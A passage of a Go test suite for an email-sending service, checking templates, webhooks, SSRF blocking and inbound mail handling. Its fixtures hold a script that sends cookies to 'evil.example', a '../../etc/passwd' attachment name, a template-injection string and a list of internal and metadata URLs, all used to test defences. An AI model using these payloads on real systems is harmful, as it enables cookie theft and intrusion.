package test

import (
	"bytes"
	"context"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/smtp"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/njiwa-tz/mail/client"
	"github.com/njiwa-tz/mail/internal/inbound"
	"github.com/njiwa-tz/mail/internal/service"
	"github.com/njiwa-tz/mail/internal/tmpl"
	"github.com/njiwa-tz/mail/internal/webhook"
)

const adminPass = "correct-horse-battery-staple"

// ---------------------------------------------------------------- admin helpers

type session struct {
	cookie, csrf string
}

func (e *env) user(email, role string) session {
	e.t.Helper()
	if _, err := e.svc.CreateUserWith(context.Background(), email, adminPass, role, true); err != nil {
		e.t.Fatal(err)
	}
	return e.login(email)
}

func (e *env) login(email string) session {
	e.t.Helper()
	r := e.raw("POST", "/admin/v1/auth/login", nil, map[string]any{"email": email, "password": adminPass})
	if r.Code != 200 {
		e.t.Fatalf("login %s: %d %s", email, r.Code, r.Raw)
	}
	c := r.Hdr.Get("Set-Cookie")
	for _, want := range []string{"HttpOnly", "Secure", "SameSite=Lax", "Path=/admin"} {
		if !strings.Contains(c, want) {
			e.t.Fatalf("session cookie missing %s: %s", want, c)
		}
	}
	return session{cookie: strings.SplitN(c, ";", 2)[0], csrf: str(r.JSON, "csrf_token")}
}

func (e *env) raw(method, path string, hdr map[string]string, body any) resp {
	var rdr io.Reader = bytes.NewReader(nil)
	if body != nil {
		j, _ := json.Marshal(body)
		rdr = bytes.NewReader(j)
	}
	r := httptest.NewRequest(method, path, rdr)
	r.Header.Set("Content-Type", "application/json")
	for k, v := range hdr {
		r.Header.Set(k, v)
	}
	return e.roundTrip(r)
}

// adm performs an authenticated admin request with the CSRF token.
func (e *env) adm(s session, method, path string, body any) resp {
	return e.raw(method, path, map[string]string{"Cookie": s.cookie, "X-CSRF-Token": s.csrf}, body)
}

func (e *env) admOK(s session, method, path string, body any) resp {
	e.t.Helper()
	r := e.adm(s, method, path, body)
	if r.Code != 200 {
		e.t.Fatalf("%s %s: %d %s", method, path, r.Code, r.Raw)
	}
	return r
}

func items(r resp) []map[string]any {
	var out []map[string]any
	for _, it := range r.JSON["items"].([]any) {
		out = append(out, it.(map[string]any))
	}
	return out
}

// ---------------------------------------------------------------- templates

func TestLocaleAndFallback(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	captured := func(body map[string]any, n string) string {
		r := e.post(k.sbx, idem(n), body)
		if r.Code != 202 {
			t.Fatalf("%s: %d %s", n, r.Code, r.Raw)
		}
		e.runWorker()
		raw, err := e.svc.ShowCapture(context.Background(), str(r.JSON, "id"))
		e.must(err)
		return strings.ReplaceAll(string(raw), "=\r\n", "")
	}
	sw := otpBody(testRcpt)
	sw["locale"] = "sw"
	if got := captured(sw, "sw"); !strings.Contains(got, "Tumia namba hii") || !strings.Contains(got, "Namba yako ya uthibitisho") {
		t.Fatalf("sw request did not render Swahili:\n%s", got)
	}
	if got := captured(otpBody("other@example.org"), "en"); !strings.Contains(got, "Use this code") || strings.Contains(got, "Tumia") {
		t.Fatalf("default locale should be English:\n%s", got)
	}

	// A version written only in English serves sw requests in English.
	ctx := context.Background()
	id, err := e.svc.CreateTemplate(ctx, service.TemplateInput{Slug: "english-only"})
	e.must(err)
	v, err := e.svc.SaveDraft(ctx, id, service.VersionInput{
		Schema:  tmpl.Schema{{Name: "name", Type: "string", MaxLen: 50, Required: true}},
		Content: map[string]tmpl.Content{"en": {Subject: "Hi {{.name}}", HTML: "<p>English only {{.name}}</p>", Text: "English only {{.name}}"}}})
	e.must(err)
	e.must(e.svc.PublishVersion(ctx, id, v))
	got := captured(map[string]any{"from": liveFrom, "to": testRcpt, "template": "english-only", "locale": "sw", "variables": map[string]any{"name": "Asha"}}, "fallback")
	if !strings.Contains(got, "English only Asha") || !strings.Contains(got, "Subject: Hi Asha") {
		t.Fatalf("missing locale should fall back to en:\n%s", got)
	}
}

func TestTemplateImmutabilityAndPinning(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	admin := e.user("admin@njiwa.co.tz", "admin")
	schema := []map[string]any{{"name": "name", "type": "string", "max_len": 50}}
	draft := func(marker string) map[string]any {
		return map[string]any{"variable_schema": schema, "content": map[string]any{
			"en": map[string]any{"subject": "Notice " + marker, "html": "<p>" + marker + " {{.name}}</p>", "text": marker + " {{.name}}"},
			"sw": map[string]any{"subject": "Taarifa " + marker, "html": "<p>" + marker + " sw {{.name}}</p>", "text": marker + " sw {{.name}}"}}}
	}
	id := str(e.admOK(admin, "POST", "/admin/v1/templates", map[string]any{"slug": "welcome", "project": "sacas"}).JSON, "id")
	base := "/admin/v1/templates/" + id

	// Drafts cannot be sent; a broken draft is rejected before it is saved.
	e.admOK(admin, "PUT", base+"/draft", draft("ONE"))
	body := map[string]any{"from": liveFrom, "to": testRcpt, "template": "welcome", "variables": map[string]any{"name": "Asha"}}
	if r := e.post(k.sbx, idem("draft"), body); r.Code != 422 || errCode(r) != "unknown_template" {
		t.Fatalf("draft must not be sendable: %d %s", r.Code, r.Raw)
	}
	bad := draft("X")
	bad["content"].(map[string]any)["en"].(map[string]any)["html"] = "<p>{{.name</p>"
	if r := e.adm(admin, "PUT", base+"/draft", bad); r.Code != 400 {
		t.Fatalf("unparseable template accepted: %d %s", r.Code, r.Raw)
	}
	bad = draft("X")
	bad["content"].(map[string]any)["en"].(map[string]any)["text"] = "{{.undeclared}}"
	if r := e.adm(admin, "PUT", base+"/draft", bad); r.Code != 400 {
		t.Fatalf("template using an undeclared variable accepted: %d %s", r.Code, r.Raw)
	}

	// Preview renders and never sends.
	before := e.count(`SELECT count(*) FROM messages`)
	pv := e.admOK(admin, "POST", base+"/versions/1/preview", map[string]any{"locale": "sw", "variables": map[string]any{"name": "<b>Asha</b>"}})
	if !strings.Contains(str(pv.JSON, "html"), "ONE sw &lt;b&gt;Asha") || str(pv.JSON, "subject") != "Taarifa ONE" {
		t.Fatalf("preview: %s", pv.Raw)
	}
	if e.count(`SELECT count(*) FROM messages`) != before {
		t.Fatal("preview queued a message")
	}

	e.admOK(admin, "POST", base+"/versions/1/publish", nil)
	if r := e.adm(admin, "POST", base+"/versions/1/publish", nil); r.Code != 409 {
		t.Fatalf("re-publish: %d", r.Code)
	}
	// Published content is immutable, in the database itself.
	for _, q := range []string{
		`UPDATE template_contents SET subject='tampered' WHERE version_id=(SELECT id FROM template_versions WHERE template_id=$1 AND version=1)`,
		`DELETE FROM template_contents WHERE version_id=(SELECT id FROM template_versions WHERE template_id=$1 AND version=1)`,
		`UPDATE template_versions SET variable_schema='[]' WHERE template_id=$1 AND version=1`,
		`DELETE FROM template_versions WHERE template_id=$1 AND version=1`,
	} {
		if _, err := e.pool.Exec(ctx, q, id); err == nil || !strings.Contains(err.Error(), "immutable") {
			t.Fatalf("published version was modifiable: %q err=%v", q, err)
		}
	}

	// Queue with version 1, then publish version 2 BEFORE the worker runs.
	queued := e.post(k.sbx, idem("pin"), body)
	if queued.Code != 202 {
		t.Fatal(queued.Raw)
	}
	e.admOK(admin, "PUT", base+"/draft", draft("TWO")) // saving a draft creates version 2 and leaves 1 alone
	e.admOK(admin, "POST", base+"/versions/2/publish", nil)
	e.runWorker()
	raw, err := e.svc.ShowCapture(ctx, str(queued.JSON, "id"))
	e.must(err)
	if !strings.Contains(string(raw), "ONE Asha") || strings.Contains(string(raw), "TWO") {
		t.Fatalf("queued mail did not keep its pinned version:\n%s", raw)
	}
	// New mail gets the newest version; an explicit version still pins.
	latest := e.post(k.sbx, idem("latest"), map[string]any{"from": liveFrom, "to": "b@example.org", "template": "welcome", "variables": map[string]any{"name": "Asha"}})
	body["template_version"], body["to"] = 1, "c@example.org"
	old := e.post(k.sbx, idem("old"), body)
	e.runWorker()
	rawLatest, _ := e.svc.ShowCapture(ctx, str(latest.JSON, "id"))
	rawOld, _ := e.svc.ShowCapture(ctx, str(old.JSON, "id"))
	if !strings.Contains(string(rawLatest), "TWO Asha") || !strings.Contains(string(rawOld), "ONE Asha") {
		t.Fatal("version selection wrong")
	}
	// A retry of a request that did not name a version still matches after a publish.
	if r := e.post(k.sbx, idem("latest"), map[string]any{"from": liveFrom, "to": "b@example.org", "template": "welcome", "variables": map[string]any{"name": "Asha"}}); r.Code != 202 || str(r.JSON, "id") != str(latest.JSON, "id") {
		t.Fatalf("idempotent replay broke: %d %s", r.Code, r.Raw)
	}
	// Another project cannot use this project's template.
	k2 := e.provision("other")
	if r := e.post(k2.sbx, idem("xproj"), map[string]any{"from": liveFrom, "to": testRcpt, "template": "welcome", "variables": map[string]any{}}); r.Code != 422 {
		t.Fatalf("template leaked across projects: %d", r.Code)
	}
}

func TestTemplateInjectionAndTestSend(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	evil := `<script>alert(1)</script>{{.code}}{{template "x"}}`
	r := e.post(k.sbx, idem("inj"), map[string]any{"from": liveFrom, "to": testRcpt, "template": "account-notice",
		"variables": map[string]any{"name": evil, "title": "Hello {{.name}}", "message": evil}})
	if r.Code != 202 {
		t.Fatal(r.Raw)
	}
	e.runWorker()
	raw, err := e.svc.ShowCapture(ctx, str(r.JSON, "id"))
	e.must(err)
	s := strings.ReplaceAll(string(raw), "=\r\n", "")
	htmlPart := s[strings.Index(s, "text/html"):]
	if strings.Contains(htmlPart, "<script>") || !strings.Contains(htmlPart, "&lt;script&gt;") {
		t.Fatalf("html variable not escaped:\n%s", htmlPart)
	}
	if !strings.Contains(s, "{{.code}}") || !strings.Contains(s, "Subject: Hello {{.name}}") {
		t.Fatalf("template syntax in a variable was evaluated:\n%s", s)
	}

	// Test-send: sandbox works for a draft; live needs a published version and an approved address.
	admin := e.user("admin@njiwa.co.tz", "admin")
	var otpID string
	for _, it := range items(e.admOK(admin, "GET", "/admin/v1/templates", nil)) {
		if it["slug"] == "otp" {
			otpID = it["id"].(string)
		}
	}
	send := func(mode, to string) resp {
		return e.adm(admin, "POST", "/admin/v1/templates/"+otpID+"/versions/1/test-send", map[string]any{"project": "sacas", "mode": mode,
			"from": liveFrom, "to": to, "locale": "sw", "variables": map[string]any{"code": "123456", "expires_in_minutes": 5}})
	}
	if r := send("sandbox", "anyone@anywhere.test"); r.Code != 200 {
		t.Fatalf("sandbox test-send: %d %s", r.Code, r.Raw)
	}
	e.must(e.svc.SetRestrictRecipients(ctx, "sacas", "live", false)) // even when live is otherwise unrestricted
	if r := send("live", "stranger@gmail.com"); r.Code != 422 || errCode(r) != "recipient_not_allowed" {
		t.Fatalf("live test-send to an unapproved address: %d %s", r.Code, r.Raw)
	}
	if r := send("live", testRcpt); r.Code != 200 {
		t.Fatalf("live test-send to approved address: %d %s", r.Code, r.Raw)
	}
	e.runWorker()
	if e.tr.Calls() != 1 {
		t.Fatalf("expected exactly one live submission, got %d", e.tr.Calls())
	}
}

// ---------------------------------------------------------------- outbound hardening

func TestOutboundHeadersEnvelopeAndWebhookOutbox(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	_, _, err := e.svc.CreateWebhook(ctx, "sacas", "live", "https://hooks.example.com/mail", []string{"email.submitted", "email.failed", "email.unknown", "email.expired"})
	e.must(err)
	_, _, err = e.svc.CreateWebhook(ctx, "sacas", "sandbox", "https://hooks.example.com/sbx", service.WebhookEvents)
	e.must(err)

	r := e.post(k.live, idem("hdr"), otpBody(testRcpt))
	id := str(r.JSON, "id")
	e.runWorker()
	if e.tr.last.From != bounceAddr {
		t.Fatalf("envelope sender should be the bounce address, got %q", e.tr.last.From)
	}
	raw := string(e.tr.last.Raw)
	for _, want := range []string{"X-DM-Message-ID: " + id, "Message-ID: <" + id + "@notify.example.com>", "Auto-Submitted: auto-generated", "From: \"Njiwa Security\" <" + liveFrom + ">"} {
		if !strings.Contains(raw, want) {
			t.Fatalf("missing header %q in:\n%s", want, raw[:400])
		}
	}
	// One outbox row, for the live endpoint only, with a safe payload.
	var payload string
	e.must(e.pool.QueryRow(ctx, `SELECT payload::text FROM webhook_deliveries WHERE event_type='email.submitted'`).Scan(&payload))
	if e.count(`SELECT count(*) FROM webhook_deliveries`) != 1 {
		t.Fatal("event should reach exactly the subscribed endpoint of the same environment")
	}
	if !strings.Contains(payload, id) || strings.Contains(payload, otpCode) || strings.Contains(payload, testRcpt) {
		t.Fatalf("webhook payload must hold ids and states only: %s", payload)
	}

	// failed / unknown / expired each emit their event.
	e.tr.fn = func(n int, _ mailerEnv) mailerRes { return permResult() }
	e.post(k.live, idem("f"), otpBody("f@example.org"))
	e.runWorker()
	e.tr.fn = func(n int, _ mailerEnv) mailerRes { return unknownResult() }
	e.post(k.live, idem("u"), otpBody("u@example.org"))
	e.runWorker()
	x := e.post(k.live, idem("x"), otpBody("x@example.org"))
	e.pool.Exec(ctx, `UPDATE messages SET expires_at=now() - interval '1 second' WHERE id=$1`, str(x.JSON, "id"))
	e.runWorker()
	for _, ev := range []string{"email.failed", "email.unknown", "email.expired"} {
		if e.count(`SELECT count(*) FROM webhook_deliveries WHERE event_type=$1`, ev) != 1 {
			t.Errorf("missing outbox row for %s", ev)
		}
	}
}

// ---------------------------------------------------------------- webhooks

type receiver struct {
	mu     sync.Mutex
	srv    *httptest.Server
	bodies [][]byte
	sigs   []string
	hdrs   []http.Header
	status int
}

func newReceiver(t *testing.T) *receiver {
	rc := &receiver{status: 200}
	rc.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		rc.mu.Lock()
		rc.bodies = append(rc.bodies, b)
		rc.sigs = append(rc.sigs, r.Header.Get("X-DM-Signature"))
		rc.hdrs = append(rc.hdrs, r.Header.Clone())
		st := rc.status
		rc.mu.Unlock()
		if st == 302 {
			http.Redirect(w, r, "https://example.com/elsewhere", 302)
			return
		}
		w.WriteHeader(st)
	}))
	t.Cleanup(rc.srv.Close)
	return rc
}

func (rc *receiver) pool() *x509.CertPool {
	p := x509.NewCertPool()
	p.AddCert(rc.srv.Certificate())
	return p
}

func (rc *receiver) set(status int) { rc.mu.Lock(); rc.status = status; rc.mu.Unlock() }
func (rc *receiver) n() int         { rc.mu.Lock(); defer rc.mu.Unlock(); return len(rc.bodies) }

// endpoint registers a webhook pointing at the local test receiver. The API
// rejects such a URL (see TestWebhookSSRF), so the row is redirected in SQL.
func (e *env) endpoint(rc *receiver, mode string, events []string) (id, secret string) {
	e.t.Helper()
	id, secret, err := e.svc.CreateWebhook(context.Background(), "sacas", mode, "https://hooks.example.com/x", events)
	e.must(err)
	_, err = e.pool.Exec(context.Background(), `UPDATE webhook_endpoints SET url=$2 WHERE id=$1`, id, rc.srv.URL)
	e.must(err)
	return id, secret
}

func TestWebhookSignatureRetryReplay(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	rc := newReceiver(t)
	epID, secret := e.endpoint(rc, "live", []string{"email.submitted"})
	d := &webhook.Deliverer{Svc: e.svc, AllowPrivate: true, RootCAs: rc.pool()}

	r := e.post(k.live, idem("wh"), otpBody(testRcpt))
	e.runWorker()
	if n, err := d.RunOnce(ctx); err != nil || n != 1 {
		t.Fatalf("deliver: n=%d err=%v", n, err)
	}
	if rc.n() != 1 {
		t.Fatal("receiver got nothing")
	}
	ev, err := client.VerifyWebhook(secret, rc.sigs[0], rc.bodies[0], time.Now())
	if err != nil {
		t.Fatalf("receiver could not verify: %v", err)
	}
	if ev.Type != "email.submitted" || !strings.Contains(string(ev.Data), str(r.JSON, "id")) {
		t.Fatalf("unexpected event: %+v %s", ev, ev.Data)
	}
	tampered := bytes.Replace(rc.bodies[0], []byte("submitted"), []byte("failed!!!"), 1)
	if _, err := client.VerifyWebhook(secret, rc.sigs[0], tampered, time.Now()); err == nil {
		t.Fatal("tampered body verified")
	}
	if _, err := client.VerifyWebhook("whsec_wrong", rc.sigs[0], rc.bodies[0], time.Now()); err == nil {
		t.Fatal("wrong secret verified")
	}
	if _, err := client.VerifyWebhook(secret, rc.sigs[0], rc.bodies[0], time.Now().Add(6*time.Minute)); err == nil {
		t.Fatal("stale timestamp verified (five-minute tolerance)")
	}
	if e.count(`SELECT count(*) FROM webhook_deliveries WHERE state='succeeded' AND last_response_code=200`) != 1 {
		t.Fatal("delivery not recorded as succeeded")
	}

	// Failing endpoint: retried with backoff, not hammered.
	rc.set(500)
	e.post(k.live, idem("wh2"), otpBody("two@example.org"))
	e.runWorker()
	d.RunOnce(ctx)
	var state string
	var attempts int
	var wait float64
	e.must(e.pool.QueryRow(ctx, `SELECT state, attempts, extract(epoch FROM next_attempt_at - now())::float8 FROM webhook_deliveries WHERE state<>'succeeded'`).Scan(&state, &attempts, &wait))
	if state != "pending" || attempts != 1 || wait < 20 || wait > 31 {
		t.Fatalf("after first failure: state=%s attempts=%d wait=%.0fs", state, attempts, wait)
	}
	if n, _ := d.RunOnce(ctx); n != 0 {
		t.Fatal("retried before the backoff elapsed")
	}
	e.pool.Exec(ctx, `UPDATE webhook_deliveries SET next_attempt_at=now() WHERE state='pending'`)
	d.RunOnce(ctx)
	e.must(e.pool.QueryRow(ctx, `SELECT attempts, extract(epoch FROM next_attempt_at - now())::float8 FROM webhook_deliveries WHERE state='pending'`).Scan(&attempts, &wait))
	if attempts != 2 || wait < 100 {
		t.Fatalf("backoff should grow: attempts=%d wait=%.0fs", attempts, wait)
	}
	// Exhausted retries end in dead (about 24 hours of schedule in production).
	e.pool.Exec(ctx, `UPDATE webhook_deliveries SET next_attempt_at=now(), attempts=9 WHERE state='pending'`)
	d.RunOnce(ctx)
	var deadID string
	e.must(e.pool.QueryRow(ctx, `SELECT id::text FROM webhook_deliveries WHERE state='dead' AND last_response_code=500`).Scan(&deadID))

	// Replay from the admin UI delivers the same event id again.
	admin := e.user("admin@njiwa.co.tz", "admin")
	rc.set(200)
	before := rc.n()
	e.admOK(admin, "POST", "/admin/v1/webhook-deliveries/"+deadID+"/replay", nil)
	d.RunOnce(ctx)
	if rc.n() != before+1 {
		t.Fatal("replay was not delivered")
	}
	var replayed struct{ ID string }
	json.Unmarshal(rc.bodies[rc.n()-1], &replayed)
	if replayed.ID != deadID {
		t.Fatalf("replay must reuse the event id: %s vs %s", replayed.ID, deadID)
	}
	if r := e.adm(admin, "POST", "/admin/v1/webhook-deliveries/"+deadID+"/replay", nil); r.Code != 200 {
		t.Fatalf("a succeeded delivery can be replayed too: %d", r.Code)
	}
	d.RunOnce(ctx)

	// Repeated consecutive failures disable the endpoint and raise an alert.
	e.must(e.svc.UpdateSettings(ctx, map[string]int{"webhook_auto_disable_after": 3}))
	rc.set(503)
	for i := 0; i < 3; i++ {
		e.post(k.live, idem(fmt.Sprintf("dis%d", i)), otpBody(fmt.Sprintf("d%d@example.org", i)))
		e.runWorker()
		d.RunOnce(ctx)
	}
	lst := items(e.admOK(admin, "GET", "/admin/v1/webhooks", nil))
	if lst[0]["id"] != epID || lst[0]["enabled"] != false || lst[0]["disabled_reason"] != "auto_disabled_consecutive_failures" {
		t.Fatalf("endpoint should be auto-disabled and say so: %v", lst[0])
	}
	if e.count(`SELECT count(*) FROM alerts WHERE kind='webhook_endpoint_disabled'`) != 1 {
		t.Fatal("no alert for the disabled endpoint")
	}
	if strings.Contains(e.admOK(admin, "GET", "/admin/v1/webhooks", nil).Raw, secret) {
		t.Fatal("signing secret leaked in a list response")
	}
}

func TestWebhookSSRF(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	for _, u := range []string{
		"http://hooks.example.com/x", "https://127.0.0.1/x", "https://localhost/x", "https://10.0.0.5/x", "https://192.168.1.10:8443/x",
		"https://169.254.169.254/latest/meta-data", "https://[::1]/x", "https://[fd00::1]/x", "https://user:pw@hooks.example.com/x",
		"https://100.64.0.1/x", "https://mailcow.internal/x", "ftp://hooks.example.com/x", "https:///nohost",
	} {
		if _, _, err := e.svc.CreateWebhook(ctx, "sacas", "live", u, []string{"email.submitted"}); err == nil {
			t.Errorf("accepted unsafe webhook URL %s", u)
		}
	}
	// Even if a private URL is in the table (or a public name resolves to a
	// private address), the connect-time check refuses it.
	rc := newReceiver(t)
	e.endpoint(rc, "live", []string{"email.submitted"})
	strict := &webhook.Deliverer{Svc: e.svc, RootCAs: rc.pool()} // production behaviour: AllowPrivate unset
	e.post(k.live, idem("ssrf"), otpBody(testRcpt))
	e.runWorker()
	strict.RunOnce(ctx)
	var reason string
	e.must(e.pool.QueryRow(ctx, `SELECT last_error FROM webhook_deliveries`).Scan(&reason))
	if reason != "destination_blocked" || rc.n() != 0 {
		t.Fatalf("loopback destination was contacted: reason=%q hits=%d", reason, rc.n())
	}
	// Redirects are never followed.
	rc.set(302)
	e.pool.Exec(ctx, `UPDATE webhook_deliveries SET next_attempt_at=now()`)
	(&webhook.Deliverer{Svc: e.svc, AllowPrivate: true, RootCAs: rc.pool()}).RunOnce(ctx)
	e.must(e.pool.QueryRow(ctx, `SELECT last_error FROM webhook_deliveries`).Scan(&reason))
	if reason != "redirect_refused" || rc.n() != 1 {
		t.Fatalf("redirect handling: reason=%q hits=%d", reason, rc.n())
	}
}

// ---------------------------------------------------------------- inbound

func (e *env) listener(sources string) string {
	e.t.Helper()
	src, err := inbound.ParseSources(sources)
	e.must(err)
	l, err := net.Listen("tcp", "127.0.0.1:0")
	e.must(err)
	ctx, cancel := context.WithCancel(context.Background())
	srv := &inbound.Server{Svc: e.svc, AllowedSources: src, MaxBytes: 200 << 10}
	done := make(chan struct{})
	go func() { srv.Serve(ctx, l); close(done) }()
	e.t.Cleanup(func() { cancel(); <-done })
	return l.Addr().String()
}

func smtpSend(addr, from string, to []string, msg string) error {
	c, err := smtp.Dial(addr)
	if err != nil {
		return err
	}
	defer c.Close()
	if err := c.Mail(from); err != nil {
		return err
	}
	for _, r := range to {
		if err := c.Rcpt(r); err != nil {
			return err
		}
	}
	w, err := c.Data()
	if err != nil {
		return err
	}
	if _, err := w.Write([]byte(strings.ReplaceAll(msg, "\n", "\r\n"))); err != nil {
		return err
	}
	if err := w.Close(); err != nil {
		return err
	}
	return c.Quit()
}

const xssHTML = `<p>Hello</p><script>fetch('https://evil.example/steal?c='+document.cookie)</script><img src="https://evil.example/pixel.gif" onerror="alert(1)">`

func inboundMail(to string) string {
	return `From: Asha Customer <asha@customer.example>
To: ` + to + `
Subject: =?utf-8?q?Re:_Ombi_la_msaada?=
Message-ID: <reply-1@customer.example>
X-Spamd-Result: default: False [1.25 / 15.00]
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="outer"

--outer
Content-Type: multipart/alternative; boundary="alt"

--alt
Content-Type: text/plain; charset=utf-8

Habari, nahitaji msaada.
--alt
Content-Type: text/html; charset=utf-8

` + xssHTML + `
--alt--
--outer
Content-Type: application/pdf; name="../../etc/passwd.pdf"
Content-Disposition: attachment; filename="../../etc/passwd.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJSBmYWtlIHBkZgo=
--outer--
`
}

func (e *env) process() {
	e.t.Helper()
	if _, err := (&inbound.Processor{Svc: e.svc}).RunOnce(context.Background()); err != nil {
		e.t.Fatal(err)
	}
}

func TestInboundHappyPathLimitsAndXSS(t *testing.T) {
	e := setup(t)
	e.provision("sacas")
	e.provision("other")
	ctx := context.Background()
	admin := e.user("admin@njiwa.co.tz", "admin")
	rc := newReceiver(t)
	epID, _ := e.endpoint(rc, "live", []string{"inbound.received"})
	e.admOK(admin, "POST", "/admin/v1/inbound-addresses", map[string]any{"project": "sacas", "mode": "live", "local_part": "support", "webhook_endpoint_id": epID})
	if r := e.adm(admin, "POST", "/admin/v1/inbound-addresses", map[string]any{"project": "other", "mode": "live", "local_part": "support"}); r.Code != 409 {
		t.Fatalf("an address belongs to exactly one project environment: %d", r.Code)
	}
	inKey, _, err := e.svc.CreateKey(ctx, "sacas", "live", []string{"inbound:read"}, "in", 0)
	e.must(err)
	otherKey, _, err := e.svc.CreateKey(ctx, "other", "live", []string{"inbound:read"}, "in", 0)
	e.must(err)
	sbxKey, _, err := e.svc.CreateKey(ctx, "sacas", "sandbox", []string{"inbound:read"}, "in", 0)
	e.must(err)

	addr := e.listener("127.0.0.0/8")
	to := "Support@" + inDomain

	// Limits and unknown recipients are rejected at SMTP, permanently.
	if err := smtpSend(addr, "x@customer.example", []string{"nobody@" + inDomain}, inboundMail("nobody")); err == nil || !strings.HasPrefix(err.Error(), "550") {
		t.Fatalf("unknown recipient: %v", err)
	}
	if err := smtpSend(addr, "x@customer.example", []string{"support@elsewhere.example"}, inboundMail("x")); err == nil || !strings.HasPrefix(err.Error(), "550") {
		t.Fatalf("foreign domain: %v", err)
	}
	big := inboundMail(to) + strings.Repeat(strings.Repeat("A", 70)+"\n", 4000) // ~280 KiB against a 200 KiB test limit
	if err := smtpSend(addr, "x@customer.example", []string{to}, big); err == nil || !strings.HasPrefix(err.Error(), "552") {
		t.Fatalf("oversized message: %v", err)
	}
	many := "From: a@b.example\nTo: " + to + "\nSubject: many\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"m\"\n\n"
	for i := 0; i < 11; i++ {
		many += fmt.Sprintf("--m\nContent-Type: text/plain\nContent-Disposition: attachment; filename=\"f%d.txt\"\n\nx\n", i)
	}
	if err := smtpSend(addr, "x@customer.example", []string{to}, many+"--m--\n"); err == nil || !strings.HasPrefix(err.Error(), "552") {
		t.Fatalf("too many attachments: %v", err)
	}
	if e.count(`SELECT count(*) FROM inbound_spool`) != 0 {
		t.Fatal("rejected mail must not be stored")
	}

	// Happy path: 250 only after the raw message is durable; parsed afterwards.
	e.must(smtpSend(addr, "asha@customer.example", []string{to}, inboundMail(to)))
	if e.count(`SELECT count(*) FROM inbound_spool WHERE state='pending'`) != 1 || e.count(`SELECT count(*) FROM inbound_messages`) != 0 {
		t.Fatal("message should be spooled, not yet parsed")
	}
	e.process()
	lst := e.do("GET", "/v1/inbound", inKey, "", nil)
	if lst.Code != 200 || len(items(lst)) != 1 {
		t.Fatalf("list via API: %d %s", lst.Code, lst.Raw)
	}
	id := items(lst)[0]["id"].(string)
	got := e.do("GET", "/v1/inbound/"+id, inKey, "", nil)
	if got.Code != 200 || got.JSON["subject"] != "Re: Ombi la msaada" || !strings.Contains(str(got.JSON, "text"), "nahitaji msaada") ||
		got.JSON["envelope_to"] != "support@"+inDomain || got.JSON["spam_score"].(float64) != 1.25 {
		t.Fatalf("parsed message: %s", got.Raw)
	}
	atts := got.JSON["attachments"].([]any)
	if len(atts) != 1 {
		t.Fatalf("attachments: %v", atts)
	}
	aid := atts[0].(map[string]any)["id"].(string)
	dl := e.do("GET", "/v1/inbound/"+id+"/attachments/"+aid, inKey, "", nil)
	if dl.Code != 200 || !strings.HasPrefix(dl.Raw, "%PDF-1.4") || !strings.HasPrefix(dl.Hdr.Get("Content-Disposition"), "attachment") ||
		dl.Hdr.Get("Content-Type") != "application/octet-stream" || strings.Contains(dl.Hdr.Get("Content-Disposition"), "/") {
		t.Fatalf("attachment download: %d %v", dl.Code, dl.Hdr)
	}
	var path string
	e.must(e.pool.QueryRow(ctx, `SELECT storage_path FROM inbound_attachments`).Scan(&path))
	if strings.Contains(path, "passwd") || strings.Contains(path, "..") {
		t.Fatalf("attachment stored under a sender-controlled name: %s", path)
	}
	// Bodies are encrypted at rest.
	var enc []byte
	e.must(e.pool.QueryRow(ctx, `SELECT text_enc FROM inbound_messages`).Scan(&enc))
	if bytes.Contains(enc, []byte("msaada")) {
		t.Fatal("inbound body stored in clear")
	}

	// Scoping: another project, another environment and a key without the scope see nothing.
	for name, key := range map[string]string{"other project": otherKey, "other environment": sbxKey} {
		if r := e.do("GET", "/v1/inbound/"+id, key, "", nil); r.Code != 404 {
			t.Errorf("%s read the message: %d", name, r.Code)
		}
		if r := e.do("GET", "/v1/inbound/"+id+"/attachments/"+aid, key, "", nil); r.Code != 404 {
			t.Errorf("%s downloaded the attachment: %d", name, r.Code)
		}
		if r := e.do("GET", "/v1/inbound", key, "", nil); len(items(r)) != 0 {
			t.Errorf("%s listed the message", name)
		}
	}
	sendOnly, _, _ := e.svc.CreateKey(ctx, "sacas", "live", []string{"emails:send"}, "s", 0)
	if r := e.do("GET", "/v1/inbound", sendOnly, "", nil); r.Code != 403 {
		t.Fatalf("missing scope: %d", r.Code)
	}

	// The event goes to the address's endpoint with ids only.
	var payload string
	e.must(e.pool.QueryRow(ctx, `SELECT payload::text FROM webhook_deliveries WHERE event_type='inbound.received' AND endpoint_id=$1`, epID).Scan(&payload))
	if !strings.Contains(payload, id) || strings.Contains(payload, "msaada") || strings.Contains(payload, "asha@") {
		t.Fatalf("inbound webhook payload: %s", payload)
	}

	// Admin UI: the HTML view cannot run script or load remote content.
	h := e.adm(admin, "GET", "/admin/v1/inbound/"+id+"/html", nil)
	csp := h.Hdr.Get("Content-Security-Policy")
	if h.Code != 200 || !strings.Contains(csp, "sandbox") || !strings.Contains(csp, "default-src 'none'") || strings.Contains(csp, "allow-scripts") {
		t.Fatalf("inbound HTML must be served sandboxed: %d csp=%q", h.Code, csp)
	}
	det := e.admOK(admin, "GET", "/admin/v1/inbound/"+id, nil)
	if !strings.Contains(str(det.JSON, "html"), "<script>") || !strings.Contains(str(det.JSON, "text"), "nahitaji") {
		t.Fatal("admin detail should carry the inbound text and HTML")
	}

	// Retention deletes bodies and attachment files.
	e.pool.Exec(ctx, `UPDATE inbound_messages SET retention_expires_at=now() - interval '1 minute'`)
	if _, err := e.svc.RunRetention(ctx); err != nil {
		t.Fatal(err)
	}
	after := e.do("GET", "/v1/inbound/"+id, inKey, "", nil)
	if after.JSON["text"] != "" || len(after.JSON["attachments"].([]any)) != 0 {
		t.Fatalf("retention left content behind: %s", after.Raw)
	}
